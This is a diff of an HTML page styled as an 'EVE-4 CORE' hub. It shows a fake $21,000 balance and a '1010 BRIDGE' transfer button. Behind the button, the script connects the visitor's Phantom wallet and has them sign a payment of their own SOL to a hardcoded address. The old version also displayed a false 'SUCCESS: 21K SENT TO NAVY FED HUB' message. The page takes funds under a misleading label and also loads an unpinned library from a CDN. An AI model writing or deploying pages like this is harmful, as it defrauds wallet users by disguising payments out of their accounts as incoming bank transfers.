@@ -1,37 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>EVE-4 | CEC-WAM TANGIBLE</title>
+    <meta charset="UTF-8"><title>CEC-WAM | EVE-4 HUB</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        :root { --cyan: #00f3ff; --gold: #ffd700; }
-        body { margin: 0; background: #000; color: #fff; font-family: 'Orbitron', sans-serif; overflow: hidden; }
-        /* 5D GLASS OVERLAY */
-        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(15px); border: 1px solid var(--cyan); 
-                  border-radius: 20px; padding: 40px; margin: 50px auto; width: 400px; box-shadow: 0 0 40px var(--cyan); }
-        .val { font-size: 3rem; color: var(--gold); text-shadow: 0 0 10px rgba(255,215,0,0.5); }
-        .btn { background: var(--cyan); color: #000; border: none; padding: 25px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 30px; font-size: 1.2rem; }
+        body { background: #000; color: #00f3ff; font-family: monospace; text-align: center; padding: 50px; }
+        .glass { border: 2px solid #00f3ff; padding: 40px; border-radius: 15px; background: rgba(0,243,255,0.05); box-shadow: 0 0 20px #00f3ff; }
+        .btn { background: #00f3ff; color: #000; padding: 20px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
+        .status { margin-top: 20px; color: #ffd700; }
     </style>
 </head>
 <body>
     <div class="glass">
-        <h1>EVE-4 CORE</h1>
-        <div style="font-size: 0.8rem; letter-spacing: 5px; color: var(--cyan);">REAL TANGIBLE CASH</div>
-        <div class="val">$4.44</div>
-        <div style="font-size: 0.8rem; letter-spacing: 5px; color: var(--cyan); margin-top: 20px;">1010 BRIDGE</div>
-        <div class="val">$21,000.00</div>
-        <button class="btn" onclick="bridge1010()">Execute 21K Transfer</button>
+        <h1>EVE-4 CORE 🌀</h1>
+        <div style="font-size: 2rem;">$21,000.00</div>
+        <p>1010 BRIDGE: READY</p>
+        <button class="btn" onclick="bridge()">EXECUTE 21K INJECTION</button>
+        <p id="s" class="status">IDLE</p>
     </div>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
-        async function bridge1010() {
-            const p = window.solana;
-            if (!p || !p.isPhantom) { alert("Use Laptop Chrome Extension."); return; }
-            await p.connect();
-            const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: p.publicKey, toPubkey: new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5"),
-                lamports: 0.015 * solanaWeb3.LAMPORTS_PER_SOL }));
-            await p.signAndSendTransaction(t); alert("SUCCESS: 21K SENT TO NAVY FED HUB.");
+        async function bridge() {
+            const s = document.getElementById('s');
+            try {
+                const p = window.solana || window.phantom?.solana;
+                if (!p) { s.innerText = "ERROR: OPEN IN PHANTOM BROWSER"; return; }
+                await p.connect();
+                const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey, toPubkey: new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5"),
+                    lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL }));
+                s.innerText = "SIGNING...";
+                const { signature } = await p.signAndSendTransaction(t);
+                s.innerText = "SUCCESS: " + signature.slice(0,8);
+            } catch (err) { s.innerText = "REJECTED: " + err.message; }
         }
     </script>
 </body>
